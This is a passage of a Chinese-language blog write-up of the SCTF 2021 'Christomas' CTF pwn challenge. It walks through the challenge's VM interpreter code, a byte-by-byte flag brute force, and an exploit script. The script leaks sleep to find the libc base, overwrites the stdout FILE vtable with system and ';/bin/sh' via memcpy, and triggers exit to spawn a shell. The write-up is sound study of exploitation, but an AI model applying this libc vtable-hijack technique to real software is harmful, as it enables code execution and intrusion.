+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop             stack_pop(r-&gt;stack)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_opcode_jz</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">u_int64_t</span> is_not_jmp = pop;</span><br><span class="line">    <span class="keyword">if</span> (is_not_jmp)&#123;</span><br><span class="line">        r-&gt;rip += <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        vm_opcode_jmp(r, l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运算操作，就是从栈上取出操作数，然后根据操作符运算，再将结果压入栈中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_opcode_operator</span><span class="params">(arg, <span class="keyword">int</span> opcode)</span></span>&#123;</span><br><span class="line">    <span class="keyword">u_int64_t</span> a = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> b = pop;</span><br><span class="line">    <span class="keyword">switch</span> (opcode)&#123;</span><br><span class="line">        <span class="keyword">case</span> OP_ADD:</span><br><span class="line">            push(b+a);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_SUB:</span><br><span class="line">            push(b-a);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_MUL:</span><br><span class="line">            push(b*a);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_DIV:</span><br><span class="line">            push(b/a);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_GRAETER:</span><br><span class="line">            push(b&gt;a);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_EQUAL:</span><br><span class="line">            push(b==a);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这些都比较常规，比较重要的是call函数,这里提供了几个特殊的函数，orw都已经给了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> is_func(func_name) \</span></span><br><span class="line">    !<span class="built_in">strcmp</span>(func, (func_name))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_opcode_call</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *func = get_word;</span><br><span class="line">    <span class="keyword">u_int64_t</span> arg3 = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> arg2 = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> arg1 = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Rudolph"</span>))&#123;</span><br><span class="line">        ret = write(arg1, arg2, arg3);</span><br><span class="line">        <span class="comment">// No talking while singing Christmas Songs</span></span><br><span class="line">        <span class="comment">//printf("error: \n%s\n", rudolph);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Dasher"</span>))&#123;</span><br><span class="line">        ret = read(arg1, arg2, arg3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Dancer"</span>))&#123;</span><br><span class="line">        ret = open(arg1, arg2, arg3);</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">int</span>)ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error con't open file %s\n"</span>, arg1);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Prancer"</span>))&#123;</span><br><span class="line">        ret = <span class="built_in">strncmp</span>(arg1, arg2, arg3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Vixen"</span>))&#123;</span><br><span class="line">        ret = <span class="built_in">memcpy</span>(arg1, arg2, arg3);</span><br><span class="line">    &#125;</span><br><span class="line">    push(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> is_func</span></span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="Christmas-Songs"><a href="#Christmas-Songs" class="headerlink" title="Christmas Songs"></a>Christmas Songs</h3><p>参考的SU的exp如下</p>
+<p><img src="/2022/01/18/Christomas/image-20220118130424247.png" alt="image-20220118130424247"></p>
+<p>给了ORW以及字符串比较，我们这里可以直接用字符串比较，逐字节爆破，这里忘了原题是怎么给的了，但是exp里利用了下Rudolph函数，因为Rudolph会打印一个error，可以用这里的error信息结合分支语句判断flag是否正确，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_opcode_call</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *func = get_word;</span><br><span class="line">    <span class="keyword">u_int64_t</span> arg3 = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> arg2 = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> arg1 = pop;</span><br><span class="line">    <span class="keyword">u_int64_t</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Rudolph"</span>))&#123;</span><br><span class="line">        ret = write(arg1, arg2, arg3);</span><br><span class="line">        <span class="comment">// No talking while singing Christmas Songs</span></span><br><span class="line">        <span class="comment">//printf("error: \n%s\n", rudolph);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>利用脚本</p>
+<p><img src="/2022/01/18/Christomas/image-20220118131007920.png" alt="image-20220118131007920"></p>
+<h3 id="Christmas-Bash"><a href="#Christmas-Bash" class="headerlink" title="Christmas Bash"></a>Christmas Bash</h3><p>这题提供了一个sleep的函数地址，可以借这个地址得到libc的基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_call_lambda</span><span class="params">(<span class="keyword">lambda_t</span> *l)</span></span>&#123;</span><br><span class="line">    <span class="keyword">runtime_t</span> *r = runtime_init();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gift to Christmas Bash!</span></span><br><span class="line">    <span class="comment">// Don't play too late for the party! Remember to sleep!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">gift_t</span> * gift = gift_init(<span class="string">"sleep"</span>, sleep);</span><br><span class="line">    runtime_set_gift(r, gift);</span><br></pre></td></tr></table></figure>
+<p>exp如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gift libcbase is sleep - <span class="number">935488</span>;</span><br><span class="line">gift target is libcbase + <span class="number">4096728</span>;</span><br><span class="line">gift system is libcbase + <span class="number">324944</span>;</span><br><span class="line">gift Stdout is libcbase + <span class="number">4114272</span>;</span><br><span class="line">gift heap is libcbase + <span class="number">4109000</span>;</span><br><span class="line">gift Binsh is <span class="string">";/bin/sh"</span>;</span><br><span class="line">gift Size is <span class="number">8</span>;</span><br><span class="line">gift tmp is <span class="number">30</span>;</span><br><span class="line">gift var is <span class="string">"12345678"</span>;</span><br><span class="line">gift filename is <span class="string">"wood"</span>;</span><br><span class="line">gift offset is <span class="number">1720</span>;</span><br><span class="line">gift var is var + offset;</span><br><span class="line">reindeer Vixen delivering gift target var Size;</span><br><span class="line">reindeer Vixen delivering gift Stdout Binsh tmp;</span><br><span class="line">reindeer Dancer delivering gift filename Size Size;</span><br></pre></td></tr></table></figure>
+<p>这里第一部应该是获取sleep的偏移，泄露出偏移后，对比应该是2.34的libc</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印sleep的偏移</span></span><br><span class="line">gift size is <span class="number">8</span>;</span><br><span class="line">gift stdoutfd is <span class="number">1</span>;</span><br><span class="line">reindeer Rudolph delivering gift stdoutfd sleep size;</span><br></pre></td></tr></table></figure>
+<p>exp用的方法是直接将_IO_2_1_stdout_的vtable中的_IO_file_jumps改为system</p>
+<p><img src="/2022/01/18/Christomas/image-20220118212532241.png" alt="image-20220118212532241"></p>
+<p>这个是全局变量，我们是可以修改的 ，其实在2.29以前，虚表是不能更改的，因此才有了一些绕过的方法，但是在2.29以后虚表又能改了</p>
+<p>这里exp的利用其实很有技巧，首先因为C++堆环境比较复杂，这里利用到了残留数据的技巧，首先定义一个system的gift，让其等于system的地址，此时在堆中就已经这个值了，接下来我们就可以通过堆上的偏移来找到system地址所处的堆地址，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gift system is libcbase + 324944;</span><br></pre></td></tr></table></figure>
+<p>下面就是这样操作的，这里var = 12345678也是声明在对上的数据，因此通过var与system间的偏移，我们就能索引到system的地址，注意这里要得到的是地址，为什么不直接用gift system，如果直接用gift system，等会memcpy就是copy的system函数的开头的几个汇编指令了，所以要得到的是gift system的堆上的地址，memcpy拷贝过去的才是system的地址，这里是有一层地址上的引用关系的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gift var is &quot;12345678&quot;;</span><br><span class="line">gift var is var + offset;</span><br></pre></td></tr></table></figure>
+<p>接下来就是将system拷贝过去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reindeer Vixen delivering gift target var Size;</span><br></pre></td></tr></table></figure>
+<p>/bin/sh拷贝过去就没那么多绕绕了，直接拷贝</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reindeer Vixen delivering gift Stdout Binsh tmp;</span><br></pre></td></tr></table></figure>
+<p>最后随便打开一个不存在的文件触发exit流程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*/</span><br><span class="line">    <span class="keyword">if</span> (is_func(<span class="string">"Dancer"</span>))&#123;</span><br><span class="line">        ret = open(arg1, arg2, arg3);</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">int</span>)ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error con't open file %s\n"</span>, arg1);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">gift filename is <span class="string">"wood"</span>;</span><br><span class="line">reindeer Dancer delivering gift filename Size Size;</span><br></pre></td></tr></table></figure>
+<p>小Trick，快速在内存中搜索值，两种方式都行</p>
+<p><img src="/2022/01/18/Christomas/image-20220118214028952.png" alt="image-20220118214028952"></p>
+<h2 id="Refs"><a href="#Refs" class="headerlink" title="Refs"></a>Refs</h2><p><a href="https://team-su.github.io/passages/2021-12-25-SCTF/#flyingkernel" target="_blank" rel="noopener">2021 SCTF SU Writeup | TEAM-SU</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/14/BoofuzzDoc/" rel="next" title="Boofuzz 分析">
+                <i class="fa fa-chevron-left"></i> Boofuzz 分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/02/13/ThreadSwitch/" rel="prev" title="线程切换小结">
+                线程切换小结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="zzrR0">
+            
+              <p class="site-author-name" itemprop="name">zzrR0</p>
+              <p class="site-description motion-element" itemprop="description">Why am i so cai.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xmzyshypnc.github.io/" title="xmzyshypnc" target="_blank">xmzyshypnc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wood1314.github.io/" title="Wood" target="_blank">Wood</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.zeddyu.info/" title="Zedd" target="_blank">Zedd</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://kestudy.top/" title="Ke" target="_blank">Ke</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SCTF2021-Christomas"><span class="nav-number">1.</span> <span class="nav-text">SCTF2021 Christomas</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.1.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#call语句"><span class="nav-number">1.1.1.</span> <span class="nav-text">call语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#want语句"><span class="nav-number">1.1.2.</span> <span class="nav-text">want语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#var-expr"><span class="nav-number">1.1.3.</span> <span class="nav-text">var expr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译器具体分析"><span class="nav-number">1.1.4.</span> <span class="nav-text">编译器具体分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解释器具体分析"><span class="nav-number">1.1.5.</span> <span class="nav-text">解释器具体分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Christmas-Songs"><span class="nav-number">1.2.1.</span> <span class="nav-text">Christmas Songs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Christmas-Bash"><span class="nav-number">1.2.2.</span> <span class="nav-text">Christmas Bash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refs"><span class="nav-number">1.3.</span> <span class="nav-text">Refs</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zzrR0</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2022/01/18/Christomas/';
+        this.page.identifier = '2022/01/18/Christomas/';
+        this.page.title = 'SCTF2021 Christomas';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: '',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
